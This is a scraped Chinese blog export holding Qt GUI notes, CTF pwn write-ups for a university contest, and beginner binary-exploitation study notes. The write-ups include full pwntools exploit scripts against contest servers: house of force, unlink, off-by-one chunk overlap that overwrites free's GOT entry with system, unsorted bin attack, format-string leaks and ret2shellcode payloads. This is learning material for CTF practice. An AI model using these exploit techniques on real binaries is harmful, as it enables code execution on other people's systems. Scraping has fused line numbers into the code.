12345678910//button.hsignals: void rang(QString);//recv.h void recvsignals(QString s);//recv.pvoid recv::recvsignals(QString second)&#123; qDebug() &lt;&lt; \"接受成功响铃\" &lt;&lt; second &lt;&lt; \"秒\";&#125; 由于连接无法分清函数地址，这里用函数指针来体现函数地址 123456//简单说一下函数指针//返回类型为空 第一个括号里为指针 第二个括号为参数 =后面是需要指向函数的地址void(recv:: *recvslot)(QString) = &amp;recv::recvsignals;void(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;connect(btn, ButtonSignal, recv1, recvslot);plz(); 成功实现 Qstring怎么去掉引号 1&gt;second.toUtf8().data() 3.信号和槽的拓展 信号可以连接信号 一个信号可以连接多个槽函数 多个信号可以连接同一个槽函数 信号和槽函数的类型必须一一对应 信号的参数个数可以大于槽函数的参数个数 信号连接信号继续下一个 我们按下按钮1才会响铃 这里用两种实现 点击连接plz函数 点击连接响铃信号,此时函数中无参数 12345678//widget.cpp QPushButton *btn1 = new QPushButton(\"响铃\",this); btn1-&gt;move(0,0); connect(btn1,&amp;QPushButton::clicked,this,&amp;Widget::plz);//widget.cpp QPushButton *btn1 = new QPushButton(\"响铃\",this); btn1-&gt;move(0,0); connect(btn1,&amp;QPushButton::clicked,btn,ButtonSignal); 效果图如下 方法1 方法2 4.Lambda表达式123456789101112131415[=]()&#123; btn1-&gt;setText(\"第二个\");&#125;(); //()调用//[]必须存在 不可省略//()重载函数的参数//= 值传递//&amp; 引用传递//a 只对a传递//&amp;a 只对引用a传递//对于想要值修改，需要mutable关键字,但不改变本体[=]()mutable&#123;m = 100 + 10; qDebug &lt;&lt; m;&#125;();//返回值 -&gt;返回值类型int ret = []()-&gt;int&#123;return 1000;&#125;(); 0x04 QMainWindow 1.菜单栏123456789101112131415//菜单栏//菜单栏最多有一个//创建菜单栏QMenuBar * bar = menuBar();//将菜单栏放入到窗口中setMenuBar(bar);//创建菜单QMenu * fileMenu = bar-&gt;addMenu(\"文件\");QMenu * editMenu = bar-&gt;addMenu(\"编辑\");//创建菜单项//fileMenu-&gt;addAction(\"新建\");QAction * action1 = fileMenu-&gt;addAction(\"新建\");//添加分隔符fileMenu-&gt;addSeparator();QAction * action2 = fileMenu-&gt;addAction(\"打开\"); 2.工具栏1234567891011121314151617181920//工具栏//工具栏 可以有多个QToolBar * toolBar = new QToolBar(this);//工具栏区域addToolBar(Qt::LeftToolBarArea,toolBar);//设置工具栏区域 只允许左右停靠toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);//设置浮动toolBar-&gt;setFloatable(false);//设置移动toolBar-&gt;setMovable(false);//设置内容//toolBar-&gt;addAction(\"新建\");toolBar-&gt;addAction(action1);//添加分割线toolBar-&gt;addSeparator();toolBar-&gt;addAction(action2);//工具栏添加控件QPushButton *btn = new QPushButton(\"点这里\",this);toolBar-&gt;addWidget(btn); 3.状态栏123456789101112//状态栏//状态栏可以有多个QStatusBar * stBar = statusBar();//设置到窗口setStatusBar(stBar);//添加标签控件//左侧提示QLabel * label = new QLabel(\"左侧信息\",this);stBar-&gt;addWidget(label);//右侧提示QLabel * label1 = new QLabel(\"右侧信息\",this);stBar-&gt;addPermanentWidget(label1); 4.浮动窗口123456//铆接部件(浮动窗口)//铆接部件 可以有多个QDockWidget * dock = new QDockWidget(\"浮动\",this);addDockWidget(Qt::BottomDockWidgetArea,dock);//设置停靠区域dock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea); 5.核心部件123//设置中心部件(只能有一个)QTextEdit * edit = new QTextEdit(this);setCentralWidget(edit); 0x05 资源文件 0x06 对话框1.基本概念1234567891011121314151617181920//新建按钮 弹出对话框 connect(ui-&gt;actionnew,&amp;QAction::triggered,[=]()&#123; //模态对话框 （不可以对其它窗口进行操作） //非模态对话框 （可以对其他窗口进行操作） //模态对话框的创建 QDialog dlg(this); //对话框的大小 dlg.resize(200,100); //对话框阻塞 dlg.exec(); //非模态对话框 QDialog *dlg2 = new QDialog(this); dlg2-&gt;resize(200,100); dlg2-&gt;show(); //关闭释放内存 dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose); &#125;); 2.标准对话框12345678910111213//消息对话框//错误对话框//QMessageBox::critical(this,\"错误\",\"错误\");//信息对话框//QMessageBox::information(this,\"消息\",\"消息\");//提问对话框//参数1 父亲 参数2 标题 参数3 提示内容 参数4 按键类型QMessageBox::question(this,\"提问\",\"提问\",QMessageBox::Save|QMessageBox::Cancel);if(QMessageBox::Save==QMessageBox::question(this,\"提问\",\"提问\",QMessageBox::Save|QMessageBox::Cancel))&#123; qDebug() &lt;&lt; \"保存\";&#125; 3.其他对话框12345678//颜色对话框//QColor color = QColorDialog::getColor(QColor(255,0,0));//文件对话框//参数1 父亲 参数2 标题 参数3 目录 参数4 文件格式//QString str = QFileDialog::getOpenFileName(this,\"打开\",\"c://\",\"(*.txt)\");//字体对话框bool flag;QFontDialog::getFont(&amp;flag,QFont(\"华文彩云\",36)); 0x07 界面布局 0x08 控件1.按钮 2.树控件12345678910//树控件的使用//水平头ui-&gt;treeWidget-&gt;setHeaderLabels(QStringList()&lt;&lt; \"英雄\" &lt;&lt; \"英雄介绍\");//加载顶层的节点QTreeWidgetItem * liitem = new QTreeWidgetItem(QStringList()&lt;&lt;\"力量\");QTreeWidgetItem * spitem = new QTreeWidgetItem(QStringList()&lt;&lt;\"速度\");QTreeWidgetItem * faitem = new QTreeWidgetItem(QStringList()&lt;&lt;\"法力\");ui-&gt;treeWidget-&gt;addTopLevelItem(liitem);ui-&gt;treeWidget-&gt;addTopLevelItem(spitem);ui-&gt;treeWidget-&gt;addTopLevelItem(faitem); 3.table控件1234567891011121314//table控件 //设置列数 ui-&gt;tableWidget-&gt;setColumnCount(3); //设置水平表头 ui-&gt;tableWidget-&gt;setHorizontalHeaderLabels(QStringList()&lt;&lt;\"姓名\" &lt;&lt;\"性别\" &lt;&lt; \"年龄\"); //设置行数 ui-&gt;tableWidget-&gt;setRowCount(5); //设置正文 ui-&gt;tableWidget-&gt;setItem(0,0,new QTableWidgetItem(\"压缩\")); //列表 QList&lt;QString&gt; namelist; QStringList sexlist; sexlist &lt;&lt; \"男\" &lt;&lt; \"男\" &lt;&lt; \"男\" &lt;&lt; \"男\"； namelist &lt;&lt; \"ll\" &lt;&lt; \"aa\" &lt;&lt; \"11\"; 4.其他控件需要的时去看库吧 0x09 Qfile文件读写","categories":[{"name":"Qt","slug":"Qt","permalink":"https://pz1o.top/categories/Qt/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"https://pz1o.top/tags/Qt/"},{"name":"实验","slug":"实验","permalink":"https://pz1o.top/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"新生赛复现","slug":"新生赛复现","date":"2020-12-06T14:22:34.000Z","updated":"2020-12-23T09:07:46.902Z","comments":true,"path":"2020/12/06/新生赛复现/","link":"","permalink":"https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"复现终于考完试了，这考前学真不是人干的，上课还是得听一听 复现一下这几道题，顺便学习堆的知识 淦 我是fw 拖了五天 终于来复现了 但发现堆已经忘得差不多了 先复习堆的基础知识 https://blog.csdn.net/qq_41453285/category_9150569.html（浅显易懂，非常适合新手学） https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/ pwn5官方wp 利用change函数中存在的任意字节堆溢出构造house of force攻击 关于house of force不懂得的可以参考这篇文章 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/ 先来看一下house of force house of force利用条件 能够以溢出等方式控制到 top chunk 的 size 域 能够自由地控制堆分配尺寸的大小 利用步骤 (1)首先先泄露出堆地址。 (2)利用堆溢出，将top chunk的size域修改为很大的数 (3)申请大块内存(可以通过堆地址和目标地址的距离进行计算)，使得top chunk的头部落在目标地址范围内。 (4)再次申请内存，那么新申请的内存即为目标地址，通常情况下(未开启FullRelro)，一般是将目标地址设为got表地址。 House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。 那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。 因为是第一次弄堆题 所以尽量弄得清楚一点 还未进入菜单 堆中情况 两个指针 添加一个 1add(0x30, \"aaaa\") 修改top chunk大小 123payload = 0x30 * 'a'payload += p64(0) + p64(0xffffffffffffffff)change(0,0x41,payload) 这时 我们需要把top指针指向堆底，从而改变函数指针 那我们应该怎么申请大小呢，我们需要“后撤步”，就是负向申请地址。那大小呢，最起码应该是0x40+0x20，然后加上一个头需要的地址（0xf）与尾部top前可用的空间（0x8）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r = remote(\"219.219.61.234\",10014)def add(size,name): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def change(idx,size,name): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx))def show(): r.recvuntil(\":\") r.sendline(\"1\")magic = 0x400D1Badd(0x30, \"ddaa\")payload = 0x30 * 'a'payload += p64(0) + p64(0xffffffffffffffff)change(0,0x41,payload)offset_to_heap_base = -(0x40 + 0x20)malloc = offset_to_heap_base - 0x8 - 0xfadd(malloc,\"dddd\")add(0x10,p64(magic) * 2)r.recvuntil(\":\")r.sendline(\"5\")print(r.recv())r.interactive() 负向申请然后打过去，然后这里应该可以只要申请足够大 然后把里面内容全覆盖为后门函数 直接调用应该都可以 unlink可以去看我刚总结的堆 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/python#coding=utf-8from pwn import *#context.log_level = 'debug'p = process('./pwn5')#p = remote('219.219.61.234','10014')elf = ELF('./pwn5')libc = elf.libcdef add(size,con): p.sendlineafter('Your choice:','2') p.sendlineafter('Plz input the size of item name:',str(size)) p.sendafter('Plz input the name:',con)def delete(idx): p.sendlineafter('Your choice:','4') p.sendlineafter('Plz enter the index of item:',str(idx))def show(): p.sendlineafter('Your choice:','1')def change(idx,size,con): p.sendlineafter('Your choice:','3') p.sendlineafter('Plz enter the index of item:',str(idx)) p.sendlineafter('Plz enter the length of item name:',str(size)) p.sendafter('Plz enter the new name of the item:',con)buf = 0x06020b8sys = 0x400D1Badd(0x60,'ccc')add(0x58,'aaa')add(0x80,'bbb')add(0x60,'eee')add(0x60,'fff')payload = p64(0)+p64(0x51)payload += p64(buf - 0x18) payload += p64(buf - 0x10)payload += 'a'*0x30payload += p64(0x50)+p8(0x90) change(1,0x80,payload)delete(2)change(1,0x40,p64(0x60)*3+ p64(0x6020a8))change(1,0x40,p64(elf.got['free']))change(0,0x40,p64(sys)*2)# delete(3)# gdb.attach(p)p.interactive() pwn6 change函数中存在单字节溢出漏洞 12345&gt;if ( heap[v1] ) &gt;&#123; printf(&quot;Content of heap : &quot;); read_input(heap[v1][1], *heap[v1] + 1LL); puts(&quot;Done !&quot;); &gt;&#125; 利用单字节溢出漏洞构造fake_chunk,free之后再次分配造成overlap,从而任意地址读写 泄露出libc基地址，修改got表，最后get_shell 毕竟一开始做堆题，上来先分析，尽量详细点 add函数 其中数据结构为 change函数 直接看exp分析吧 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *r = remote(\"219.219.61.234\",10015)heap = ELF('./pwn6')libc = ELF('./libc.so.6')context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def change(idx,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx))def show(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))free_got = heap.got['free']add(0x18, 'AAAA') #0add(0x10, 'AAAA') #1change(0, \"/bin/sh\\x00\" + 'A'*0x10 + \"\\x41\")delete(1)add(0x30,p64(0)*4 + p64(0x20) + p64(heap.got['free']))show(1)r.recvuntil(\"Content : \")data = r.recvuntil(\"Done !\")free_addr = u64(data.split(\"\\n\")[0].ljust(8,'\\x00'))libc_base = free_addr -libc.symbols['free']log.success('libc base addr:'+hex(libc_base))system_addr = libc_base + libc.symbols[\"system\"]change(1,p64(system_addr))delete(0)r.interactive() 先说一下思路 单字节溢出，我们可以通过修改chunk_size来overlap，达到任意读写的目的 由于后门函数没有，所以我们就应该想调用system函数，首要的就是泄露libc基址，其次获取system函数 改free的got表 达到调用 这里来写一下exp的思路 先申请两个堆块，之后修改第一个堆块，第一个堆块可以写入/bin/sh的参数，然后我们修改第二个堆块的size，使其进入fastbin中，让我们再次分配 我们进行重新分配，这是就可以任意写，把got表中的free写进去，然后读出来，泄露基址 修改free的got表为system的地址然后直接free(0)也就调用了/bin/sh 下面是关键截图 写入/bin/sh 释放1之后 问题这里说一下我自己的问题 我一直认为fakechunk被释放后进入fastbin中，我一直认为fastbin中只有一个chunk 知道我惊人地发现它居然是free了两回是两个chunk 我才醒悟 为什么它不直接从top chunk中分配（我个fw，盯着看了两个小时也没看出来） 总结，自己总是在自己想这个堆怎么运行，很少去调试。还是应该多动手（要不是我调试能力不太行） pwn7 很简单的unsorted bin attack,利用此攻击修改flag为一个很大的数就可以获得shell了 关于unsorted bin attack可以参考这篇文章 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *r = remote(\"219.219.61.234\",10016)context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def change(idx,size,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))#def show(idx):# r.recvuntil(\":\")# r.sendline(\"3\")# r.recvuntil(\":\")# r.sendline(str(idx))add(0x20, \"AAAA\") #0add(0x80, \"AAAA\") #1add(0x20, \"AAAA\") #2delete(1)flag = 0x6020a0fd = 0bk = flag - 0x10change(0, 0x20 + 0x20, \"a\"*0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))add(0x80, \"AAAA\")r.recvuntil(0x80, \"AAAA\")r.recvuntil(\":\")r.sendline(\"666\")r.interactive() pwn8 add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现 任意写","categories":[{"name":"复现","slug":"复现","permalink":"https://pz1o.top/categories/%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"堆","slug":"堆","permalink":"https://pz1o.top/tags/%E5%A0%86/"},{"name":"复现","slug":"复现","permalink":"https://pz1o.top/tags/%E5%A4%8D%E7%8E%B0/"}]},{"title":"CUMT2020入门赛","slug":"CUMT2020入门赛","date":"2020-11-28T10:20:47.000Z","updated":"2020-11-28T12:46:19.100Z","comments":true,"path":"2020/11/28/CUMT2020入门赛/","link":"","permalink":"https://pz1o.top/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/","excerpt":"","text":"CUMT2020入门赛本不准备写的，主要tcl，还是留个坑位等考完试来复现 主要对堆不理解，并且不懂漏洞利用点在哪里 Pwntest_ncnc连接拿flag pwn21234567891011121314151617181920212223from pwnlib import gdbfrom pwnlib import contextfrom pwnlib.tubes.remote import remotefrom pwnlib.tubes.process import processfrom pwnlib.elf.elf import ELFfrom pwnlib.util.packing import make_packerp = make_packer(word_size=64)bd = 0x400756#r = process(\"./overflow\")r = remote(\"219.219.61.234\",10011)r.recvuntil(b'Welcome to CTF2020!\\n')r.recvuntil(b'Please input your username\\n')r.sendline(b'%11$p')pp = r.recv()print(pp)r.sendline(b'a'*0x28 + p(int(pp, 16)) + b'a'*8 + p(0x400756))r.interactive() pwn3栈溢出 pwn4整数溢出 输入65536 得到shell pwn5(fail)先贴exp，考完试来学习 漏洞点想的是一样的 但其中有些细节不太懂 利用change函数中存在的任意字节堆溢出构造house of force攻击 关于house of force不懂得的可以参考这篇文章 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r = remote(\"219.219.61.234\",10014)def add(size,name): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def change(idx,size,name): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx))def show(): r.recvuntil(\":\") r.sendline(\"1\")magic = 0x400D1Badd(0x30, \"ddaa\")payload = 0x30 * 'a'payload += p64(0) + p64(0xffffffffffffffff)change(0,0x41,payload)offset_to_heap_base = -(0x40 + 0x20)malloc = offset_to_heap_base - 0x8 - 0xfadd(malloc,\"dddd\")add(0x10,p64(magic) * 2)r.recvuntil(\":\")r.sendline(\"5\")print(r.recv())r.interactive() pwn6(fail) change函数中存在单字节溢出漏洞 12345&gt;if ( heap[v1] ) &gt;&#123; printf(&quot;Content of heap : &quot;); read_input(heap[v1][1], *heap[v1] + 1LL); puts(&quot;Done !&quot;); &gt;&#125; 利用单字节溢出漏洞构造fake_chunk,free之后再次分配造成overlap,从而任意地址读写 泄露出libc基地址，修改got表，最后get_shell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *r = remote(\"219.219.61.234\",10015)heap = ELF('./pwn6')libc = ELF('./libc.so.6')context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def change(idx,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx))def show(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))free_got = heap.got['free']add(0x18, 'AAAA') #0add(0x10, 'AAAA') #1change(0, \"/bin/sh\\x00\" + 'A'*0x10 + \"\\x41\")delete(1)add(0x30,p64(0)*4 + p64(0x20) + p64(heap.got['free']))show(1)r.recvuntil(\"Content : \")data = r.recvuntil(\"Done !\")free_addr = u64(data.split(\"\\n\")[0].ljust(8,'\\x00'))libc_base = free_addr -libc.symbols['free']log.success('libc base addr:'+hex(libc_base))system_addr = libc_base + libc.symbols[\"system\"]change(1,p64(system_addr))delete(0)r.interactive() pwn7(fail) 很简单的unsorted bin attack,利用此攻击修改flag为一个很大的数就可以获得shell了 关于unsorted bin attack可以参考这篇文章 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *r = remote(\"219.219.61.234\",10016)context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def change(idx,size,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))#def show(idx):# r.recvuntil(\":\")# r.sendline(\"3\")# r.recvuntil(\":\")# r.sendline(str(idx))add(0x20, \"AAAA\") #0add(0x80, \"AAAA\") #1add(0x20, \"AAAA\") #2delete(1)flag = 0x6020a0fd = 0bk = flag - 0x10change(0, 0x20 + 0x20, \"a\"*0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))add(0x80, \"AAAA\")r.recvuntil(0x80, \"AAAA\")r.recvuntil(\":\")r.sendline(\"666\")r.interactive() pwn8(fail) add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现 任意写 MiscMISC签到题ook解码 双重洗脑与佛论禅+社会主义价值观 真·签到加qq拍一拍 猜猜可莉把flag藏到哪了脱进010，直接盲文解密 7的意志！压缩包密码7 栅栏加凯撒 奇怪的题改像素可以得到一张散开的二维码 把三个拼一个二维码 补三个定位符","categories":[{"name":"wp","slug":"wp","permalink":"https://pz1o.top/categories/wp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"}]},{"title":"0day安全读书笔记","slug":"0day安全读书笔记","date":"2020-10-27T14:29:36.000Z","updated":"2020-11-20T14:17:51.878Z","comments":true,"path":"2020/10/27/0day安全读书笔记/","link":"","permalink":"https://pz1o.top/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"前言三个月一起读完0day安全，赶紧拿来读一读，随缘更新 正文","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"逆向工程核心原理读书笔记","slug":"逆向工程核心原理读书笔记","date":"2020-10-27T08:09:08.000Z","updated":"2020-11-20T14:20:02.585Z","comments":true,"path":"2020/10/27/逆向工程核心原理读书笔记/","link":"","permalink":"https://pz1o.top/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"前言预估三个月，但说不定为了赶其他的ddl，也就读不完了，尽力去吧 正文","categories":[{"name":"逆向","slug":"逆向","permalink":"https://pz1o.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://pz1o.top/tags/%E9%80%86%E5%90%91/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"PWN学习","slug":"PWN学习","date":"2020-10-24T14:32:31.000Z","updated":"2020-12-11T09:17:54.335Z","comments":true,"path":"2020/10/24/PWN学习/","link":"","permalink":"https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"PWN纯零基础，大佬请略过 从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论 大学中是研究深度还是广度，我可能还是需要选择一下 基本全是ppt截图 基础 1234gcc -S a.c #生成汇编文件file a.s #查看文件类型 可以看见是ascii文本gcc a.s #生成可执行文件file a.out #可以看见是可执行文件 ELF文件 虚拟内存 程序编译与链接 程序装载与进程执行 汇编指令 栈溢出基础基本原理 实例 攻击 ret2text返回地址为后门地址 ret2shellcode返回地址为写入的shellcode的地址 栈中写入shellcode bss段写入shellcode ret2libc 返回导向编程基础 攻击 调用构造 x64存放参数放入寄存器中 但超过6个就会放入栈中 动态链接过程 保护措施RELRORelocation Read-Only 它分为两种，Partial RELRO 和 Full RELRO，即 部分RELRO 和 完全RELRO。 部分RELRO 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。但是从攻击者角度来看呢，部分RELRO 不堪一击，因为它仅仅使 GOT 存储在 bss 段之前，这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。 1234gcc -o a a.c // 默认情况下，是Partial RELROgcc -z norelro -o a a.c // 关闭，即No RELROgcc -z lazy -o a a.c // 部分开启，即Partial RELROgcc -z now -o a a.c // 全部开启，即Full RELRO The NX bits主要是保护栈区不可执行，通常在checksec中可以查看 ASLR地址随机化，也很好理解，就是不想让你找到真正的内存地址 改变值的命令 1sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space ASLR 并不负责代码段和数据段的随机化，这由 PIE 负责，但是只有在开启 ASLR 之后，PIE 才会生效。 Canary这种栈保护措施在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值， 也称哨兵值，通俗理解，我们可以把它看成一个cookie 它是程序每次运行时随机产生的。 在恢复寄存器状态之前和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个函数的某个操作改变了，如果发现异常程序会中止。最近的 GCC 版本可能会试图自动插入这种溢出检测值。 1234gcc -o a a.c // GCC 可能会试图自动插入这种溢出检测值gcc -fno-stack-protector -o a a.c //禁用栈保护gcc -fstack-protector -o a a.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o a a.c //启用堆栈保护，为所有函数插入保护代码 PIE位置无关代码，负责代码段和数据段bss 12345gcc -o test test.c // 默认情况下，不开启PIEgcc -fpie -pie -o test test.c // 开启PIE，此时强度为1gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE 栈迁移控制ESP 格式化字符串漏洞前提：有printf 且第一个参数可控 泄露栈内存 泄露任意地址内存 篡改栈内存 篡改任意地址内存 12345678910111213%x%p 打印栈上内容%s 打印栈上解析地址的内容%n 写内容(打印字节的个数)printf(&quot;%d%d%d&quot;,a,b,c)printf(&quot;%3$d&quot;,a,b,c) 控制第三个参数printf(&quot;%20c&quot;,c)printf(&quot;aaa%n&quot;,c)printf(&quot;%7$n&quot;)%n 0x00000004%hn 0x0004 堆什么是堆 堆管理器 逻辑链表：指针连起来,把同类的chunk连起来 物理链表：通过size域组织相邻chunk之间的关系，判断相邻是否为free chunk，若是，则合并 arena chunk malloced chunkchunk pre size:记录上一个free chunk的大小，若上一个chunk在用，则pre size将被合并 size:整个chunk 的大小 top chunk 从操作系统批发的不分给用户的chunk free chunksmall bin chunk large bin chunk fast bin chunk pre size 复用 bin分配方式：fastbin —&gt;unsorted bin—&gt;small bin/large bin tcachefastbins bin的双向链表 unsorted bin small bins large bins 实例 堆漏洞 fastbin unsorted bin 工具学习pwntools1234567891011121314151617181920212223242526272829303132333435363738394041#Import pwntoolsfrom pwn import *#Local communicationio = process(\"./a.out\")#Telecommunicationio = remote(\"ip\",port)#Receive messageio.recvline()io.recvuntil(b\":\")io.recvuntil(b\" : \",drop = True)io.recv()#Send messageio.sendline(b\"abc\")io.send(p32(0)+b\"\\x0a\")io.sendlineafter(b\" :\",str)#Interactiveio.interactive()#shellcodeshellcraft.sh() #in sh environmentshellcraft.amd64.sh() #64 bitasm(shellcraft.sh()) #machine codeasm(shellcraft.sh()).ljust(112,b'a') #if the length is less than 112,then it will be supplemented whith a. #if you want to attack the 64 bit,pls add itcontext.arch = \"amd64\"#find stringself = ELF(\"./filename\")hex(next(elf.search(b\"/bin/sh\")))#elf fileelf = ELF(\"./file\")hex(elf.got[\"puts\"])hex(elf.plt[\"system\"])hex(elf.symbols[\"buf2\"])#flatflat([1,2])#generate datacyclic(60)#byte datap32(1234)\\xd2\\x04\\x00\\x00u32(\"\\xd2\\x04\\x00\\x00\")1234 gdb123456789101112131415161718192021222324252627282930313233343536373839404142434445#startgdb filestart#run the executablerun#backtracebacktrace#returnreturn#breakpointb mainb functionb *0x#information for breakpointinfo b#delete the breakpointd num#runr #next step overn #step in s #stackstack sizestack 24#virtual memory map#to look rwx segmentvmmap#plt pltx px/20 p#gotgot#chunkfastbinheap#libcb *$rebase(0x18540)pause()attach pidreturn IDA1234G 直接跳转地址shift+f12 打开字符串窗口shift+E 提取字符串n 重命名变量 ROPgadget1ROPgadget --binary filename --only &quot;pop|ret&quot; one_gadget1libcbase + one_gadget_address 练习题非常简单，适合入门 栈溢出ret2text直接有后门函数，所以我们只需要把垃圾数据填满覆盖ebp，然后让返回地址返回后门函数的地址就行 1234567from pwn import *io = process(\"./ret2text\")payload = b'a'*20 + p32(0x8048522)io.sendline(payload)io.interactive() ret2shellcode自己写入shellcode(bss)，然后溢出地址 12345678910from pwn import * io = process(\"./ret2shellcode\")buf2 = 0x804a080shellcode = asm(shellcraft.sh()).ljust(112,b'a')payload = shellcode + p32(buf2)io.sendline(payload)io.interactive() ret2syscallROPgadget 12345678910111213from pwn import *io = process(\"./ret2syscall\")pop_eax = 0x80bb196pop_edx = 0x806eb90int_80 = 0x08049421payload =flat([ b'A'* 112 , pop_eax , 0xb ,pop_edx, 0, 0, 0x80be408 ,int_80])print(io.recv())io.sendline(payload)io.interactive() ret2libc1 栈溢出，有/bin/sh字符串 system@plt 构造 12345678from pwn import *elf = ELF(\"./ret2libc1\")io = process(\"./ret2libc1\")system_plt = 